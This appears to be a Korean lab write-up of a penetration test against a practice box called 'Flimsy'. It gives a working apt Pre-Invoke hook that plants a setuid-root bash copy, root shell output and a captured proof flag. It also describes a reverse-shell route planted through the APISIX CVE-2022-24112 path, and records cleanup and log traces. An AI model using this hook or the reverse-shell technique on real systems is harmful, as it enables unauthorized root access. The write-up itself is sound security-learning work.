> [!danger] 훅 파일은 로컬에서 만들어 `curl` 로 내려받을 것 — 원격에서 만들면 이스케이프가 한 겹 먹힌다
> 처음에 `printf` 로 타겟에서 직접 만들었더니 내용 끝에 **리터럴 `n`** 이 붙었음. `tmux send-keys` 를 거치며 `printf '%s\n'` 의 백슬래시가 벗겨져 포맷 문자열이 `%sn` 이 된 것임. `apt.conf` 파서는 이런 것을 그냥 뱉고 죽음. 경위와 교훈은 [[_PLAYBOOK#B-84. 원격에서 만든 스크립트는 이스케이프가 «한 겹» 먹힌다]].

```bash
franklin@flimsy:/tmp$ printf %s\n "APT::Update::Pre-Invoke {\"cp /bin/bash /tmp/
rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash\";};" > /etc/a
pt/apt.conf.d/99zzpwn; cat /etc/apt/apt.conf.d/99zzpwn; ls -l /etc/apt/apt.conf.
d/99zzpwn
...
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootb
ash; chmod 4755 /tmp/rootbash";};n-rw-rw-rw- 1 franklin nogroup 114 Aug 20 12:30
```
— tmux 스크롤백 원문(80칸 줄접힘·PTY 에코 그대로, `...` 는 에코 줄 생략). **파일로 떨궈두지 않았고 세션 기록에서 옮긴 것**

끝이 `;};n` — 파일은 붙었으나 마지막 바이트가 개행이 아니라 `n` 임. 21:31 에 `curl` 로 교체하고 **`cat -A` 로 눈으로 확인**했음.

```text
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootb
ash; chmod 4755 /tmp/rootbash";};$
```
— 같은 스크롤백. 현재 Kali 에 남은 `apt_hook_99zzpwn.conf` 를 `cat -A` 로 다시 떠도 동일하고 `wc -c` = 114(본문 113 + 개행)임

**`$` 로 끝나면 정상.** 깨진 쪽도 114바이트였다는 점에 주의 — `본문 + 'n'` 과 `본문 + 개행` 이 같은 크기라 **파일 크기로는 구분되지 않음.** 교체 결과는 `traces_confirmed.log` 의 `### files I created` 에 `-rw-rw-rw- 1 franklin nogroup 114 Aug 20 12:31 /etc/apt/apt.conf.d/99zzpwn` 로 남아 있음(12:30 → 12:31).

**발화**

크론 한 사이클(최대 60초) 뒤. 아래는 tmux 스크롤백 원문임 — **파일로 떨궈두지 않았고**, 나중에 저장한 `pane_root.txt` 는 이 뒤쪽만 담고 있어 이 부분은 세션 기록에서 옮긴 것임. 명령이 두 번 찍히는 PTY 에코와 80칸 줄접힘이 그대로임.

```bash
franklin@flimsy:/tmp$ ls -l /tmp/rootbash 2>&1
ls -l /tmp/rootbash 2>&1
-rwsr-xr-x 1 root root 1183448 Aug 20 12:32 /tmp/rootbash
franklin@flimsy:/tmp$ /tmp/rootbash -p
/tmp/rootbash -p
franklin@flimsy:/tmp$ export PS1="root@\h:\w# "; /usr/bin/id; /usr/bin/whoami; /
bin/ls -la /root
export PS1="root@\h:\w# "; /usr/bin/id; /usr/bin/whoami; /bin/ls -la /root
uid=65534(franklin) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
root
total 80
drwx------  9 root root 4096 Aug 20 12:18 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..
lrwxrwxrwx  1 root root    9 Jun 30  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jun 16  2022 .cache
-rw-r--r--  1 root root 1085 Jun 30  2022 .group.bak
drwxr-xr-x  3 root root 4096 Jun 16  2022 .local
-rw-r--r--  1 root root 2930 Jun 30  2022 .passwd.bak
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwxr-xr-x  2 root root 4096 Jun 30  2022 .rpmdb
-rw-r--r--  1 root root 1745 Jun 30  2022 .shadow.bak
drwx------  2 root root 4096 Jun 15  2022 .ssh
-rw-r--r--  1 root root  165 Jun 30  2022 .wget-hsts
-rw-r--r--  1 root root 8072 Jun 18  2022 build.sh
drwx------  3 root root 4096 Aug  3  2024 default.etcd
drwxr-xr-x  4 root root 4096 Jun 30  2022 flimsy
-rw-------  1 root root  854 Jun 30  2022 nohup.out
-rw-------  1 root root   33 Aug 20 12:18 proof.txt
-rwxrwxrwx  1 root root  154 Jun 30  2022 run.sh
drwx------  3 root root 4096 Jun 15  2022 snap
root@flimsy:/tmp#
```

`-p` 는 장식이 아님. bash 는 `euid ≠ uid` 로 시작하면 스스로 특권을 드롭하고 `-p` 가 그 드롭을 막음. 그래서 `id` 가 `uid=65534 ... euid=0` 로 남음 — 정상임.

**두 번째 경로 — 존재하나 franklin 은 도달 불가**

root 로 올라온 뒤 보이는 것.

```text
### /root/run.sh
#!/bin/bash

cp /root/.passwd.bak /etc/passwd
cp /root/.shadow.bak /etc/shadow
cp /root/.group.bak /etc/group

nohup etcd &
apisix init 
apisix start

### ls -l /root/run.sh
-rwxrwxrwx 1 root root 154 Jun 30  2022 /root/run.sh
```
— 출처: `~/PG/Flimsy/root_context.txt`

`run.sh` 는 **777** 이고 크론이 매분 root 로 실행함. 한 줄 덧붙이면 그대로 root 임. 그런데 `/root` 가 `drwx------` 라 franklin 은 **디렉터리를 통과할 수 없음.** 경로가 존재해도 도달이 불가능함.

**이 경로는 실제로 사용하지 않았음** — root 를 잡은 뒤에 발견했으므로 권한상승 수단이 될 수 없었음. `[가정]` `/root` 의 퍼미션이 `755` 였다면 이쪽이 apt 훅보다 빠른 경로였을 것임.

이 스크립트가 `Initial Access` 절의 관측도 설명함. APISIX 를 root 가 `/root` 에서 띄우므로 셸의 cwd 가 `/root` 였고, `/etc/passwd`·`shadow`·`group` 이 매분 백업본으로 덮여쓰기 때문에 **`/etc/passwd` 에 사용자를 추가하는 고전 경로는 60초 안에 지워짐.**

**관리 키 3차 확인**

```text
### apisix config etcd/admin
34:  admin_key:
35-    - name: admin
36:      key: edd1c9f034335f136f87ad84b625c8f1  # using fixed API token has security risk, please update it when you deploy to production environment
37-      role: admin
```
— 출처: `~/PG/Flimsy/root_context.txt`

기본 키가 그대로였고, 주석은 벤더가 직접 「바꿔 쓰라」고 적어둔 것임.

### Post-Exploitation

**Proof.txt value:** `0c8587812f2ae784dbb5642833405d2e`

```bash
root@flimsy:/tmp# /usr/bin/whoami; /usr/bin/id; /bin/hostname; /bin/hostname -I;
 /bin/date; /bin/cat /root/proof.txt
/usr/bin/whoami; /usr/bin/id; /bin/hostname; /bin/hostname -I; /bin/date; /bin/c
at /root/proof.txt
root
uid=65534(franklin) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
flimsy
192.168.248.220
Thu Aug 20 12:33:22 UTC 2026
0c8587812f2ae784dbb5642833405d2e
root@flimsy:/tmp#
```
— 출처: `~/PG/Flimsy/proof_root.txt` (80칸 줄접힘은 `capture-pane` 캡처 그대로)

`euid=0` 인 상태에서 원위치 `cat` 으로 읽음. 웹셸이 아님.

**남긴 흔적**

되돌린 것 — `ls` 로 부재 확인 완료.

```text
/bin/ls: cannot access '/etc/apt/apt.conf.d/99zzpwn': No such file or directory
/bin/ls: cannot access '/tmp/rootbash': No such file or directory
/bin/ls: cannot access '/tmp/h.sh': No such file or directory
/bin/ls: cannot access '/tmp/.h': No such file or directory
```

훅을 먼저 지우고 한 크론 사이클을 기다린 뒤 `rootbash` 를 지웠음. **순서를 반대로 하면 다음 분에 다시 생성됨.**

되돌리지 못한 것 — **APISIX 라우트 `id=pwn1`**(`uri=/pwn1`, `filter_func` 안에 `192.168.45.207:443` 리버스셸). **삭제 확인 못 함. 박스 정지로 해소.**

| | |
|---|---|
| **내가 한 것** | 21:38 에 `batch-requests` 로 DELETE 를 **한 번** 보냈음. **응답을 받지 못했음.** 직후 APISIX 가 응답 불능이 되어 `routes_after_cleanup.json` 이 0바이트로 남았고, **삭제됐는지 남았는지 검증할 수 없게 됨** |
| **어떻게 해소됐나** | 작업 종료 후 **박스가 정지·리버트되면서** 라우트가 사라짐. **내가 지운 것이 아님** |

검증이 불가능해진 시점에 「남아 있다고 가정」으로 뒀음. 안전한 쪽으로 틀리는 판단이고 그것이 옳았음 — 남의 IP 도 아닌 **내 LHOST 로 나가는 리버스셸을 라우트에 심어놓고** 「아마 지워졌을 것」로 넘기면 다음 사람이 그 박스에서 정체불명의 connect-back 을 보게 됨. **「확인된 삭제」와 「리버트로 사라짐」은 전혀 다른 정보임.**

**APISIX 서비스 자체가 응답 불능 상태**로 남았음. 21:36 KST = 12:36 UTC 이후. 타겟 **안에서** `127.0.0.1:43500` 을 때려도 같았고 22·80·3306·ping 은 정상이었으므로 네트워크가 아니라 APISIX 프로세스 문제임. 재획득도 4회(21:43~21:47) 전부 무응답.

```text
--- plain GET / on 43500 ---
http=000 time=12.002099
--- port state ---
PORT      STATE SERVICE         VERSION
9443/tcp  open  tungsten-https?
43500/tcp open  unknown
```
— **파일로 보존하지 못했음.** 셸을 잃은 뒤의 확인이라 세션 기록에서 옮긴 것

원인은 `[가정]` — 매분 도는 `run.sh` 의 `nohup etcd &` + `apisix start` 누적에 gobuster 41만 요청이 겹친 것으로 봄. **실측으로 확인하지 못했고 반대 증거가 하나 있음** — 12:33 에 뜬 `harvest_root.txt` 프로세스 목록에는 `etcd` **한 개**(pid 1143, 12:16 기동)와 APISIX nginx 워커 **두 개**(pid 1365·1366)뿐이라 누적이 보이지 않음. 「인스턴스 누적」보다 **gobuster 부하** 쪽이 유력하나 그것도 확인한 것이 아님. 경위는 [[_PLAYBOOK#A-32. 진입점을 내 페이로드로 죽였다]].

서비스 가용성을 깬 것은 그 자체로 보고 대상임.

로그에 남은 것 — 확인만 하고 삭제하지 않았음.

```text
### nginx logs present
-rw-r----- 1 www-data adm 43040628 Aug 20 12:36 access.log
### total lines access.log
419537 /var/log/nginx/access.log
### fixed-string count of our IP
419573
### sample of our lines
192.168.45.207 - - [20/Aug/2026:12:23:41 +0000] "GET /15a7cc66-f735-4b27-b0a7-414898cd12b3 HTTP/1.1" 404 134 "-" "gobuster/3.8"
### apisix access log our IP
49
```
— 출처: `~/PG/Flimsy/traces_nginx.log` (발췌 — 회전 로그 5개·`error.log` 행과 `### sample of our lines` 의 나머지 7행 생략)

- `/var/log/nginx/access.log` — 우리 IP 로 **419,573행**, 파일 43,040,628 바이트(43MB). 거의 전부 gobuster. 21:35 시점 별도 카운트는 **395,013**(`traces_confirmed.log` `### nginx access (80) my hits`) — 세 값이 다른 이유는 grep 종류가 아니라 **로그가 계속 자라고 있었기 때문**임([[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]]). 지우지 않았음 — 「남긴 흔적」이 요구하는 것은 지우는 것이 아니라 무엇을 남겼는지 알고 적는 것임. 다만 단일 IP 에서 15분간 42만 요청이면 어떤 모니터링이 붙어 있어도 **탐지됨**
- `/usr/local/apisix/logs/access.log` — 우리 IP 로 **49행**
- `/var/log/auth.log` — 우리 세션 항목 **없음**. CRON 세션만 기록돼 있음. 리버스셸은 PAM 을 거치지 않음
- `wtmp`(`last`) — 우리 항목 **없음**. pty 로그인이 아니기 때문임. 남은 것은 2022년 `root pts/0`·`pts/1` from `10.9.1.4` 와 부팅 기록뿐
- `/var/log/apt/history.log` — **우리 항목 없음.** 「훅이 걸려 있던 동안의 `apt-get update` 항목」이 남았을 것 같으나 아님 — `apt-get update` 는 history.log 에 아무것도 쓰지 않음(Kali 에서 실행 전후 diff 로 확인, 무변화). 이 파일에 있는 것은 같은 시간대의 `unattended-upgrade` 항목들이고 박스가 스스로 돌린 것임. 훅은 `Pre-Invoke` 라 더더욱 남지 않음

확인하지 않은 것 — `/var/log/syslog`, `btmp`, APISIX `error.log` 는 열어보지 않았음. 셸을 잃은 뒤라 확인이 불가능해졌음.

Kali 쪽 — tmux 세션 전부 종료(`no server running`), 80/443/8080 리스너 없음, `/tmp/wwwfli` 삭제 확인.

## 관련

- CVE-2022-24112 — Apache APISIX `batch-requests` 플러그인의 클라이언트 IP 제한 우회. 영향 범위: APISIX 1.3 ~ 2.12.0, 2.10.x LTS 는 2.10.4 미만
- Apache APISIX Admin API / `filter_func` 라우트 스키마 문서 — `filter_func` 가 Lua 로 평가된다는 것이 이 익스플로잇의 근거
- `APT::Update::Pre-Invoke` — `apt.conf(5)`. `apt-get update` 전에 실행되는 셸 명령 목록
- Apache APISIX 2.8 `conf/config-default.yaml` — `allow_admin` · `admin_key` 기본값의 1차 사료
- 산출물: `~/PG/Flimsy/` (Kali, 26개 파일) — `nmap_quick.log`, `nmap.log`, `nmap.full.txt`, `gobuster_root.txt`/`.full.txt`, `try1_batch_probe.sh`/`.log`, `try2_route_create.log`, `try3_trigger.log`, `try4_trigger2.log`, `routes_preexisting.json`, `routes_after_cleanup.json`, `exploit_apisix.py`, `apt_hook_99zzpwn.conf`, `pane_full.txt`, `pane_root.txt`, `harvest_franklin.txt`, `harvest_root.txt`, `root_context.txt`, `proof_user.txt`, `proof_root.txt`, `traces_confirmed.log`, `traces_nginx.log`, `shell443.log`, `shot_80_upright_decoy.png`, `writeup_notes.txt`
- [[_PLAYBOOK#B-15. 헤더 기반 IP 접근제어 우회]] · [[_PLAYBOOK#B-31. 크론 기반 권한상승]] · [[_PLAYBOOK#B-34. root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승]] · [[_PLAYBOOK#B-84. 원격에서 만든 스크립트는 이스케이프가 «한 겹» 먹힌다]]
- [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-32. 진입점을 내 페이로드로 죽였다]] · [[_PLAYBOOK#A-33. 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f`]] · [[_PLAYBOOK#A-44. 셸을 잡으면 `netstat -tulpn` 도 친다]]
- [[_PLAYBOOK#B-1-35. Apache APISIX — batch-requests 로 Admin API 우회 → 라우트 `filter_func` Lua RCE (CVE-2022-24112)]] — 이 박스의 진입 경로 카드
- [[_PLAYBOOK#A-69. 산출물을 「정리」하다 실패의 증거를 지웠다]] — `shell443.log`·`routes_after_cleanup.json` 삭제와 복원 경위
- [[_PLAYBOOK#A-1-15. 웹이 상위 1000 포트 «밖»에만 있다]] · [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] — 43500 미등재 검증과 로그 카운트 불일치의 해석
- [[Astronaut]] — 크론 발화형 권한상승. 「파일을 쓴 시각과 코드가 도는 시각이 다르다」가 같은 형태
- [[Exfiltrated]] · [[Muddy]] — 크론 기반 권한상승 누적 패턴
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] — 「버전 판정은 독립 근거 2개」 누적 패턴
- [[Crane]] · [[RubyDome]] · [[Squid]] — 「응답이 성공을 뜻하지 않는다」. 이 박스에서는 반대 방향 — **트리거의 타임아웃이 실패가 아니라 성공의 정상 형태**였고, batch-requests 는 **바깥 200 과 안쪽 status 를 따로 봐야** 했음
- [[Robust]] — 헤더 위조로 IP 접근제어를 우회한 같은 부류(`X-Forwarded-For`)
